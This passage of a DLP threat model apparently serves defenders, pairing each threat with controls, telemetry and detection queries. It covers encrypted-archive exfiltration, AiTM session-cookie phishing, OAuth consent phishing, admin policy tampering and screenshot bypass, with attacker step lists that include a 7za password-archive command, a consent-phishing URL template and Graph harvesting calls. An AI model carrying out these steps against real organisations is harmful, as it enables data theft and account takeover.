+    C1 -->|No| A2[Attacker copies CONFIDENTIAL files to USB]:::attack
+    A2 --> C2{Endpoint DLP agent NTFS hook intercepts write?}:::control
+    C2 -->|Yes| B2[DLP agent blocks write and fires SIEM alert]:::blocked
+    C2 -->|No - agent absent| A3[Files written to USB successfully]:::attack
+    A3 --> A4[Attacker encrypts archive on USB to defeat inspection]:::attack
+    A4 --> C3{SIEM detects archive creation after sensitive access?}:::control
+    C3 -->|Yes| B3[SOC investigates and confiscates device]:::blocked
+    C3 -->|No| A5[USB carried offsite - permanent IP and PII loss]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t4-encrypted-archive-creation-before-transfer">T4 — Encrypted Archive Creation Before Transfer</h3>
+<p><strong>STRIDE category:</strong> Tampering, Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, Medium impact<br />
+<strong>Attacker objective:</strong> Wrap sensitive files in a password-protected ZIP or 7z archive before transmission, rendering the payload opaque to all content-inspection-based DLP controls — turning a content-inspection problem into a binary allow/deny decision on encrypted blobs.</p>
+<h4 id="how-the-attacker-would-exploit-it_3">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker has access to sensitive files and an archiving tool (7-Zip, WinRAR, built-in Windows ZIP, or <code>zip</code> on macOS/Linux).</li>
+<li><strong>Step 1:</strong> Download or access CONFIDENTIAL/RESTRICTED files from SharePoint or local disk.</li>
+<li><strong>Step 2:</strong> Run <code>7za.exe a -tzip -p&lt;password&gt; output.zip *.xlsx *.docx *.pdf</code> — creates AES-256 encrypted archive that is completely opaque to DLP content inspection.</li>
+<li><strong>Step 3:</strong> Email the encrypted ZIP as an attachment, or upload to personal cloud storage — DLP content engine sees an opaque binary blob, cannot identify labels or PII patterns inside.</li>
+<li><strong>Step 4:</strong> Communicate the password via separate channel (personal SMS, WhatsApp) — not inspectable.</li>
+<li><strong>Step 5:</strong> Impact: RESTRICTED data transmitted past all content-inspection controls; DLP incident queue shows zero violations for this transfer.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_3">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Endpoint DLP agent process telemetry: alert on <code>7za.exe</code>, <code>winrar.exe</code>, <code>zip.exe</code> invocations with <code>-p</code> password flag within 30 minutes of accessing CONFIDENTIAL/RESTRICTED-labeled files — does not inspect content but detects the behavior pattern.</li>
+<li><strong>Control 2:</strong> Email transport rule: block or quarantine outbound emails containing encrypted/password-protected ZIP attachments (identifiable by file extension <code>.zip</code>, <code>.7z</code>, <code>.rar</code> combined with encrypted archive header magic bytes).</li>
+<li><strong>Control 3:</strong> CASB policy: flag and quarantine uploads of files with <code>.zip</code>, <code>.7z</code>, <code>.rar</code> extensions to unsanctioned destinations; require human review of opaque archives over 1MB.</li>
+<li><strong>Control 4:</strong> Endpoint DLP agent: alert when an archive file is written to a removable media path or browser download/staging directory within 30 minutes of accessing RESTRICTED data (behavior-based, not content-based).</li>
+<li><strong>Control 5:</strong> User notification + justification workflow: automated prompt to user when DLP detects potential opaque archive — require business justification within 4 hours before allowing transmission; no response escalates to SOC.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_3">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Endpoint DLP agent process events: <code>ProcessName = 7za.exe</code>, <code>CommandLine contains -p</code>, <code>ParentProcess = explorer.exe or cmd.exe</code> (interactive user context), timestamp, <code>user_sid</code>.</li>
+<li>CASB upload events: file extension <code>.zip</code>, <code>.7z</code>, <code>.rar</code> uploaded to external destination; <code>content_category = Encrypted Archive</code>, <code>action = quarantined</code>.</li>
+<li>Exchange Online Message Trace: <code>AttachmentNames</code> contains <code>.zip</code>, <code>.7z</code>, <code>.rar</code>; <code>MessageSize</code> exceeds threshold; <code>Recipient</code> is external domain.</li>
+<li>Windows Security <code>Event ID 4688</code>: process creation for <code>7za.exe</code> or <code>WinRAR.exe</code> with command-line arguments logged (requires process command-line audit policy enabled).</li>
+</ul>
+<h4 id="purple-team-validation-commands_3">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate process command-line auditing is enabled (required to detect 7za -p flag)
+# Run on managed endpoint or via Intune script (authorized lab)
+auditpol /get /subcategory:&quot;Process Creation&quot;
+# Expected: Process Creation = Success and Failure
+# Also verify: Computer Config &gt; Policies &gt; Admin Templates &gt; System &gt; Audit Process Creation
+#   &quot;Include command line in process creation events&quot; = Enabled
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect encrypted archive creation after CONFIDENTIAL file access
+// Source: DeviceProcessEvents + DeviceFileEvents (MDE)
+let sensitiveFileAccess = DeviceFileEvents
+| where Timestamp &gt; ago(1h)
+| where SensitivityLabel in (&quot;Confidential&quot;, &quot;Restricted&quot;)
+| project DeviceId, UserId = InitiatingProcessAccountName, SensitiveAccessTime = Timestamp;
+DeviceProcessEvents
+| where Timestamp &gt; ago(2h)
+| where FileName in (&quot;7za.exe&quot;, &quot;7z.exe&quot;, &quot;WinRAR.exe&quot;, &quot;zip.exe&quot;)
+| where ProcessCommandLine contains &quot;-p&quot; or ProcessCommandLine contains &quot;--password&quot;
+| join kind=inner sensitiveFileAccess on DeviceId
+| where Timestamp between ((SensitiveAccessTime - 30m) .. (SensitiveAccessTime + 30m))
+| project Timestamp, DeviceName, AccountName, ProcessCommandLine, SensitiveAccessTime
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_3">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker accesses RESTRICTED files on managed endpoint]:::attack
+    A1 --> A2[Runs 7za.exe with password flag to create encrypted archive]:::attack
+    A2 --> C1{Endpoint DLP agent detects 7za with -p flag after sensitive access?}:::control
+    C1 -->|Yes| B1[Alert fired - archive quarantined pending justification]:::blocked
+    C1 -->|No| A3[Encrypted archive created successfully]:::attack
+    A3 --> A4[Attaches archive to external email]:::attack
+    A4 --> C2{Email transport rule blocks encrypted ZIP to external domain?}:::control
+    C2 -->|Yes| B2[Email quarantined - DLP incident ticket opened]:::blocked
+    C2 -->|No| A5[Encrypted archive uploaded to personal cloud storage]:::attack
+    A5 --> C3{CASB detects opaque archive upload and quarantines?}:::control
+    C3 -->|Yes| B3[CASB quarantine triggers human review]:::blocked
+    C3 -->|No| A6[RESTRICTED data exits via opaque channel with no DLP match]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t5-aitm-phishing-for-session-cookie">T5 — AiTM Phishing for Session Cookie</h3>
+<p><strong>STRIDE category:</strong> Spoofing, Information Disclosure<br />
+<strong>Risk:</strong> Medium likelihood, Critical impact<br />
+<strong>Attacker objective:</strong> Steal an authenticated browser session cookie using an adversary-in-the-middle phishing proxy, bypassing TOTP-based MFA, then use the stolen session to bulk-download sensitive data from SharePoint or Exchange.</p>
+<h4 id="how-the-attacker-would-exploit-it_4">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker operates an AiTM phishing proxy (Evilginx2, Modlishka, or the Microsoft-documented DEV-1101 phishing kit) targeting corporate Microsoft 365 authentication.</li>
+<li><strong>Step 1:</strong> Victim receives convincing phishing email with a link to the AiTM proxy. Victim authenticates normally — proxy relays credentials and MFA challenge to real Microsoft 365 and captures the resulting session cookie.</li>
+<li><strong>Step 2:</strong> Attacker loads the stolen session cookie into a browser using a cookie editor extension (<code>EditThisCookie</code>, <code>Cookie-Editor</code>) and accesses SharePoint, Exchange, and Teams as the victim.</li>
+<li><strong>Step 3:</strong> Bulk download of sensitive files using SharePoint "Download all" or Microsoft Graph API calls with the victim's session token.</li>
+<li><strong>Step 4:</strong> Set inbox forwarding rule (see T1) using the stolen session to maintain persistent access after cookie expiry.</li>
+<li><strong>Step 5:</strong> Impact: victim's full email history and cloud storage accessible until session is invalidated; if device binding is absent, session is re-usable from any device globally.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_4">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> FIDO2 hardware security keys (YubiKey 5 series) for all users with CONFIDENTIAL/RESTRICTED data access — FIDO2 is bound to the origin domain and cannot be relayed by an AiTM proxy (origin binding defeats the relay attack).</li>
+<li><strong>Control 2:</strong> Entra ID Conditional Access: Require <code>AuthenticationStrength = Phishing-resistant MFA</code> for all SharePoint CONFIDENTIAL sites, Exchange, and Teams; block TOTP and SMS methods for these resources.</li>
+<li><strong>Control 3:</strong> Entra ID Identity Protection: token context binding — Continuous Access Evaluation (CAE) forces re-authentication when IP, device, or session risk changes during the session.</li>
+<li><strong>Control 4:</strong> SIEM alert: successful authentication from IP in threat intelligence feed OR sign-in from device fingerprint not seen in past 90 days for that user AND EntraID risk score = High → SOAR revokes all sessions immediately.</li>
+<li><strong>Control 5:</strong> Defender for Cloud Apps anomaly detection: impossible-travel alert when authenticated session IP changes by more than 500km within 1 hour (AiTM proxy is geographically separate from victim).</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_4">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Azure AD SigninLogs: <code>RiskState = atRisk</code>, <code>RiskDetail = adminGeneratedTemporaryPassword or leakedCredentials</code>, <code>DeviceDetail.isCompliant = false</code>, <code>IPAddress</code> in threat intelligence feed.</li>
+<li>Microsoft Defender for Identity: <code>SuspiciousMailboxAccess</code> alert when new device fingerprint accesses mailbox with bulk read operations.</li>
+<li>Entra ID <code>CAE_TokenRevocation</code> events: confirm CAE is actively revoking sessions on risk state change.</li>
+<li>CASB/Defender for Cloud Apps: <code>ActivityType = AdminActivity</code> on a non-admin account; bulk <code>FileDownloaded</code> operations within 60-minute window from new IP.</li>
+</ul>
+<h4 id="purple-team-validation-commands_4">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate phishing-resistant MFA is enforced for SharePoint and Exchange
+# Run in Azure AD PowerShell (authorized lab tenant)
+Get-MgIdentityConditionalAccessPolicy |
+  Where-Object { $_.DisplayName -like &quot;*Phishing-resistant*&quot; -or $_.DisplayName -like &quot;*FIDO2*&quot; } |
+  Select-Object DisplayName, State, Conditions, GrantControls
+# Expected: Policy state = enabled; GrantControls includes authenticationStrength.policyId for phishing-resistant
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect high-risk sign-in followed by bulk SharePoint download (AiTM indicator)
+// Source: SigninLogs + OfficeActivity
+let riskySignins = SigninLogs
+| where RiskLevelDuringSignIn in (&quot;high&quot;, &quot;medium&quot;)
+| where ResultType == 0  // successful sign-in
+| project UserId, RiskySigninTime = TimeGenerated, IPAddress, DeviceDetail;
+OfficeActivity
+| where Operation == &quot;FileDownloaded&quot;
+| summarize DownloadCount = count(), TotalBytes = sum(OfficeObjectId) by UserId, bin(TimeGenerated, 1h)
+| where DownloadCount &gt; 50
+| join kind=inner riskySignins on UserId
+| where TimeGenerated between ((RiskySigninTime - 30m) .. (RiskySigninTime + 2h))
+| project TimeGenerated, UserId, IPAddress, DownloadCount, RiskySigninTime
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_4">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Victim clicks AiTM phishing link - proxy relays auth]:::attack
+    A1 --> C1{Is FIDO2 phishing-resistant MFA enforced?}:::control
+    C1 -->|Yes| B1[FIDO2 origin binding defeats relay - attack fails]:::blocked
+    C1 -->|No - TOTP only| A2[Session cookie captured by AiTM proxy]:::attack
+    A2 --> A3[Attacker loads cookie and bulk downloads SharePoint]:::attack
+    A3 --> C2{CAE or Conditional Access detects new device or IP risk?}:::control
+    C2 -->|Yes| B2[CAE revokes session - re-auth required with FIDO2]:::blocked
+    C2 -->|No| A4[Attacker has full session - sets forwarding rule and downloads data]:::attack
+    A4 --> C3{SIEM impossible-travel or bulk-download alert fires?}:::control
+    C3 -->|Yes| B3[SOAR revokes all sessions within 30 min]:::blocked
+    C3 -->|No| A5[Sustained account takeover with full data access]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t6-oauth-application-with-broad-persistent-data-scopes">T6 — OAuth Application with Broad Persistent Data Scopes</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure, Elevation of Privilege<br />
+<strong>Risk:</strong> Medium likelihood, High impact<br />
+<strong>Attacker objective:</strong> Obtain or create an OAuth application with <code>Files.Read.All</code> or <code>Mail.Read</code> scopes granted at tenant level, then silently harvest corporate data via the Microsoft Graph API — persisting after the original granting user's account is deprovisioned.</p>
+<h4 id="how-the-attacker-would-exploit-it_5">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> An employee grants an OAuth application broad scopes, or an attacker registers a malicious OAuth app and tricks an employee into consenting via an OAuth phishing email.</li>
+<li><strong>Step 1:</strong> Attacker crafts OAuth consent phishing link: <code>https://login.microsoftonline.com/&lt;tenant&gt;/oauth2/v2.0/authorize?client_id=&lt;malicious-app&gt;&amp;scope=Files.ReadWrite.All+Mail.Read&amp;response_type=code</code>. Victim clicks and consents.</li>
+<li><strong>Step 2:</strong> App receives refresh token valid for 90 days (default without admin-constrained token lifetime policy). Attacker uses token to call <code>GET https://graph.microsoft.com/v1.0/me/drive/root/children?$top=999</code> and <code>GET /me/messages</code> repeatedly.</li>
+<li><strong>Step 3:</strong> After victim's employment terminates, the refresh token remains valid if automated token revocation at offboarding is not implemented — attacker has persistent API access with no active user session.</li>
+<li><strong>Step 4:</strong> Bulk harvest of Drive files and email metadata without any DLP agent telemetry (traffic looks like a sanctioned API call from a registered application).</li>
+<li><strong>Step 5:</strong> Impact: months of silent data collection via Graph API; victim's complete OneDrive and mailbox accessible until token is explicitly revoked.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_5">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Azure AD app registration policy: <code>User consent for apps</code> = <code>Do not allow user consent</code> — all OAuth app consents require admin approval, blocking the OAuth consent phishing vector.</li>
+<li><strong>Control 2:</strong> Token lifetime policy: configure <code>refreshTokenMaxInactiveTime = 8h</code> and <code>maxRefreshTokenAge = 24h</code> for apps requesting data read scopes — limits attacker window per token.</li>
+<li><strong>Control 3:</strong> Quarterly OAuth app review: enumerate all apps with <code>Files.Read*</code>, <code>Mail.Read*</code>, <code>Sites.Read.All</code> scopes — revoke unused or unrecognized app registrations.</li>
+<li><strong>Control 4:</strong> SIEM alert: OAuth token refresh event for user where HR system marks status = TERMINATED → Critical alert; auto-revoke via <code>Revoke-MgUserSignInSession</code> within 2 minutes.</li>
+<li><strong>Control 5:</strong> Microsoft Defender for Cloud Apps: app governance policy — alert on any app performing <code>FileDownloaded</code> or <code>MailRead</code> operations at volume &gt; P95 baseline for that app.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_5">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Azure AD AuditLogs: <code>ActivityType = ConsentToApplication</code>, <code>Scope contains Files.ReadWrite.All or Mail.Read</code>, <code>ConsentType = user</code> (admin consent not obtained — policy violation).</li>
+<li>Azure AD SigninLogs: <code>AppDisplayName</code>, <code>ResourceDisplayName = Microsoft Graph</code>, <code>AuthenticationMethod = OAuth</code>, <code>UserId</code> cross-referenced with HR termination records.</li>
+<li>Defender for Cloud Apps App Governance: <code>AppId</code>, <code>TenantId</code>, <code>PermissionsGranted</code>, <code>DataAccessVolume</code> for each app.</li>
+<li>Microsoft Graph activity logs: <code>operationName = Get /me/drive/root/children</code>, <code>callerIpAddress</code>, <code>userId</code>, high-frequency pattern indicative of scraping.</li>
+</ul>
+<h4 id="purple-team-validation-commands_5">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Enumerate all OAuth apps with broad data scopes granted in the tenant
+# Run in Microsoft Graph PowerShell (authorized lab - read-only)
+Get-MgServicePrincipal -All |
+  ForEach-Object {
+    $sp = $_
+    Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId $sp.Id |
+      Where-Object { $_.Scope -match &quot;Files.Read|Mail.Read|Sites.Read&quot; } |
+      Select-Object @{N=&quot;App&quot;;E={$sp.DisplayName}}, Scope, ConsentType, PrincipalId
+  }
+# Review output: any ConsentType = AllPrincipals (tenant-wide) is highest risk
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect OAuth consent grant to app with sensitive scopes
+// Source: AuditLogs
+AuditLogs
+| where OperationName == &quot;Consent to application&quot;
+| extend Scopes = tostring(TargetResources[0].modifiedProperties[0].newValue)
+| where Scopes contains &quot;Files.Read&quot; or Scopes contains &quot;Mail.Read&quot; or Scopes contains &quot;Sites.Read&quot;
+| extend Actor = tostring(InitiatedBy.user.userPrincipalName)
+| extend AppName = tostring(TargetResources[0].displayName)
+| project TimeGenerated, Actor, AppName, Scopes, ConsentType = Category
+| order by TimeGenerated desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_5">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker sends OAuth consent phishing email with malicious app link]:::attack
+    A1 --> C1{User consent for apps blocked - admin approval required?}:::control
+    C1 -->|Yes| B1[User cannot consent - admin reviews and rejects malicious app]:::blocked
+    C1 -->|No| A2[Employee consents - attacker gets long-lived refresh token]:::attack
+    A2 --> C2{Token lifetime policy limits refresh to 8-24 hours?}:::control
+    C2 -->|Yes| B2[Token expires quickly - attacker window very short]:::blocked
+    C2 -->|No| A3[Token valid 90 days - persists after employee termination]:::attack
+    A3 --> C3{Post-termination token revocation automated at offboarding?}:::control
+    C3 -->|Yes| B3[Token revoked at HR termination event within 2 min]:::blocked
+    C3 -->|No| A4[Attacker calls Graph API for months harvesting Drive and Mail]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t7-dlp-policy-tampering-by-privileged-admin">T7 — DLP Policy Tampering by Privileged Admin</h3>
+<p><strong>STRIDE category:</strong> Tampering, Repudiation<br />
+<strong>Risk:</strong> Medium likelihood, Critical impact<br />
+<strong>Attacker objective:</strong> A privileged DLP or IT admin modifies the DLP policy exclusion list or disables inspection scope for a specific user or file type, creating a permanent blind spot that allows targeted exfiltration to proceed with zero DLP incident telemetry.</p>
+<h4 id="how-the-attacker-would-exploit-it_6">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker is or has compromised a DLP administrator account with Microsoft Purview Compliance Portal write access or equivalent.</li>
+<li><strong>Step 1:</strong> Admin logs into Microsoft Purview Compliance Portal during off-hours (avoids peer observation).</li>
+<li><strong>Step 2:</strong> Navigates to a RESTRICTED-tier DLP policy → Exceptions → adds the target exfiltrating user to the "User Exclusion" list, or changes the policy scope to exclude the specific SharePoint site containing target data.</li>
+<li><strong>Step 3:</strong> Policy change takes effect immediately — all DLP inspection for that user or site is disabled. Any subsequent exfiltration by that user generates zero DLP incident tickets.</li>
+<li><strong>Step 4:</strong> If the SIEM monitoring DLP policy changes is also under DLP admin control, the alert for the policy change can be suppressed or tuned away.</li>
+<li><strong>Step 5:</strong> Impact: targeted exfiltration runs indefinitely; victim user can now bulk-download and upload with no DLP blocks; the admin's action leaves no DLP incident evidence — only the policy audit log remains.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_6">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> All DLP policy changes via infrastructure-as-code (Terraform + Purview REST API) stored in Git — GUI is read-only for production; any GUI-originating change is blocked and triggers immediate alert.</li>
+<li><strong>Control 2:</strong> Two-person integrity: ITSM JIRA/ServiceNow ticket required with a second DLP engineer's approval before any RESTRICTED-tier policy change is applied; SOAR validates ticket existence before allowing change to proceed.</li>
+<li><strong>Control 3:</strong> SIEM (owned by a team independent of DLP) ingests Purview Compliance Portal audit log; alert fires within 5 minutes on <code>ExclusionAdded</code>, <code>RuleDisabled</code>, <code>UserExceptionCreated</code> — auto-escalates to CISO if no corresponding ITSM ticket exists.</li>
+<li><strong>Control 4:</strong> SOAR auto-revert: Terraform <code>plan</code> + <code>apply</code> to restore last known-good DLP policy from Git HEAD within 10 minutes of unauthorized change detection; DLP admin's Purview access revoked pending investigation.</li>
+<li><strong>Control 5:</strong> Weekly automated canary test: synthetic RESTRICTED-labeled file transmitted via email and CASB upload — CI pipeline asserts DLP block event fires within SLA; if canary fails, CISO is paged directly, bypassing the DLP team.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_6">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Microsoft Purview Compliance Portal Audit Log: <code>RecordType = ComplianceSettingsChange</code>, <code>Operation = PolicyUpdated or ExclusionAdded or RuleDisabled</code>, <code>UserId</code> (DLP admin), <code>PolicyName</code>, <code>OldValue</code>, <code>NewValue</code>.</li>
+<li>ITSM system: cross-reference <code>ChangeRequestId</code> — absence of open ticket for the admin at time of change is the primary indicator.</li>
+<li>Git history: authorized changes leave a PR merge commit; unauthorized changes have no corresponding commit (IaC drift detection).</li>
+<li>Weekly canary pipeline results: CI job <code>dlp-canary-validation</code> — <code>Pass</code> (DLP block fired) or <code>Fail</code> (DLP block did not fire — policy tampered).</li>
+</ul>
+<h4 id="purple-team-validation-commands_6">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate DLP policy exclusion list and compare to Git-managed baseline
+# Run in Purview PowerShell (authorized lab)
+Get-DlpComplianceRule | Where-Object { $_.Disabled -eq $true } |
+  Select-Object Name, Disabled, WhenChanged, LastModifiedBy
+# Any rule disabled outside of an approved change window is a finding
+
+# Also check user exceptions
+Get-DlpCompliancePolicy | Select-Object Name, ExchangeSenderMemberOf, Workload |
+  Where-Object { $_.ExchangeSenderMemberOf -ne $null }
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect DLP policy modification without corresponding ITSM change ticket
+// Source: PurviewComplianceAuditLog (custom connector or via Office 365 Management API)
+PurviewComplianceAuditLog
+| where RecordType == &quot;ComplianceSettingsChange&quot;
+| where Operation in (&quot;PolicyUpdated&quot;, &quot;RuleUpdated&quot;, &quot;ExceptionCreated&quot;, &quot;ExclusionAdded&quot;)
+| extend AdminUPN = tostring(UserId)
+| extend PolicyName = tostring(ObjectId)
+| join kind=leftouter (
+    ServiceNowChangeRequests  // or JIRA tickets ingested as custom table
+    | where State == &quot;Open&quot;
+    | project ITSMTicket = TicketId, AssignedTo, OpenedAt
+  ) on $left.AdminUPN == $right.AssignedTo
+| where ITSMTicket == &quot;&quot;  // no open ticket for this admin
+| project TimeGenerated, AdminUPN, Operation, PolicyName, ITSMTicket
+| order by TimeGenerated desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_6">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[DLP admin logs into Purview Compliance Portal]:::attack
+    A1 --> C1{Is GUI write access blocked - IaC only for production?}:::control
+    C1 -->|Yes| B1[GUI change blocked - must use Git PR workflow]:::blocked
+    C1 -->|No| A2[Admin adds user exception to RESTRICTED-tier policy]:::attack
+    A2 --> C2{SIEM alert fires within 5 min for ExclusionAdded?}:::control
+    C2 -->|Yes - no ITSM ticket| B2[CISO paged - SOAR auto-reverts policy via Terraform]:::blocked
+    C2 -->|No - SIEM also under DLP admin control| A3[Policy change undetected for hours or days]:::attack
+    A3 --> A4[Target user exfiltrates bulk data with zero DLP telemetry]:::attack
+    A4 --> C3{Weekly canary pipeline detects DLP block failure?}:::control
+    C3 -->|Yes| B3[CISO alerted via CI pipeline - independent of DLP team]:::blocked
+    C3 -->|No| A5[Sustained exfiltration with no DLP evidence trail]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t8-screenshot-camera-and-print-to-pdf-bypass">T8 — Screenshot, Camera, and Print-to-PDF Bypass</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, Low impact (volume-limited by physical constraint)<br />
+<strong>Attacker objective:</strong> Capture sensitive information displayed on screen via screenshot tools, mobile camera, or print-to-PDF — completely bypassing all file-level, network-level, and content-inspection DLP controls since no file copy or network transfer occurs.</p>
+<h4 id="how-the-attacker-would-exploit-it_7">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker has authorized access to view sensitive data on screen (financial model, compensation data, customer PII list displayed in browser or application).</li>
+<li><strong>Step 1:</strong> Use built-in OS screenshot tool (<code>Win+Shift+S</code>, <code>PrtScr</code>, <code>screencapture</code> on macOS) to capture screen contents — this is a legitimate OS function that DLP agents cannot block without breaking usability.</li>
+<li><strong>Step 2:</strong> Alternatively, aim a mobile device camera at the monitor — no corporate control exists on a personal mobile phone in a WFH environment.</li>
+<li><strong>Step 3:</strong> Print-to-PDF: <code>Ctrl+P → Microsoft Print to PDF</code> — creates an unclassified PDF on disk from CONFIDENTIAL labeled content displayed in browser; DLP agent may not hook the print spooler for web-rendered content.</li>
+<li><strong>Step 4:</strong> Screenshots and photos are on a personal device — no corporate endpoint or network telemetry captures them.</li>
+<li><strong>Step 5:</strong> Impact: targeted IP theft for specific documents; lower volume than bulk digital exfiltration but entirely undetectable technically.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_7">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Employment agreement with explicit IP assignment and confidentiality clauses covering screen capture and camera — establishes legal liability as the primary deterrent.</li>
+<li><strong>Control 2:</strong> Security awareness training: employees trained to understand that camera capture of CONFIDENTIAL screens is a policy violation with termination and legal consequences.</li>
+<li><strong>Control 3:</strong> Physical security in high-sensitivity areas: clear-desk policy; entry-point mobile device lockers for R&amp;D, Finance, and Legal areas; camera-facing desk layout policies.</li>
+<li><strong>Control 4:</strong> Print spooler audit: Windows Security <code>Event ID 307</code> (document printed) with document name logged — DLP agent can hook print spooler for CONFIDENTIAL-labeled documents and alert (though cannot reliably block without false-positive risk for all printing).</li>
+<li><strong>Control 5:</strong> Digital watermarking: sensitive documents displayed via a DRM viewer (Azure Information Protection viewer, Vera, or Sealpath) embed invisible user-identifying watermarks on every page rendered — provides forensic attribution after the fact even for printed/photographed copies.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_7">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Windows Security Event Log <code>Event ID 307</code>: <code>PrinterName</code>, <code>DocumentName</code>, <code>UserName</code>, <code>PrintedDocumentPageCount</code> — correlate document name with DLP classification labels.</li>
+<li>Microsoft Purview AIP Activity Log: document opened events for RESTRICTED-labeled files viewed in AIP-protected viewer — <code>UserId</code>, <code>DocumentName</code>, <code>AccessTime</code>.</li>
+<li>DLP agent: <code>Operation = PrintAction</code>, <code>LabelName = Confidential/Restricted</code>, <code>Destination = Microsoft Print to PDF or physical printer</code> — generate audit log entry with justification prompt.</li>
+<li>Watermark forensics: if a screenshot or photo appears externally, the embedded watermark identifies the specific user and session — supports legal/HR action.</li>
+</ul>
+<h4 id="purple-team-validation-commands_7">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate print spooler auditing is configured for sensitive document printing
+# Check Purview Endpoint DLP print policy
+Get-DlpComplianceRule | Where-Object { $_.AccessScope -like &quot;*Print*&quot; } |
+  Select-Object Name, AccessScope, NotifyUser, GenerateIncidentReport
+# Expected: PrintAction scope generates IncidentReport for CONFIDENTIAL/RESTRICTED labels
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_7">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker views RESTRICTED financial model on screen]:::attack
+    A1 --> C1{Document displayed via DRM viewer with watermark?}:::control
+    C1 -->|Yes| B1[Screenshot or photo contains forensic watermark - attribution possible]:::blocked
+    C1 -->|No| A2[Attacker screenshots or photographs screen]:::attack
+    A2 --> A3[Image on personal device - no corporate telemetry]:::attack
+    A3 --> C2{Physical controls prevent mobile in sensitive areas?}:::control
+    C2 -->|Yes| B2[Physical deterrent reduces camera capture risk]:::blocked
+    C2 -->|No - WFH context| A4[Targeted IP captured with zero technical detection]:::impact
+    A1 --> A5[Attacker uses Print to PDF to create unclassified copy]:::attack
+    A5 --> C3{Endpoint DLP alerts on print action for RESTRICTED label?}:::control
+    C3 -->|Yes| B3[Audit log created - analyst reviews justification]:::blocked
+    C3 -->|No| A6[Unclassified PDF created on disk - bypasses all label-based controls]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
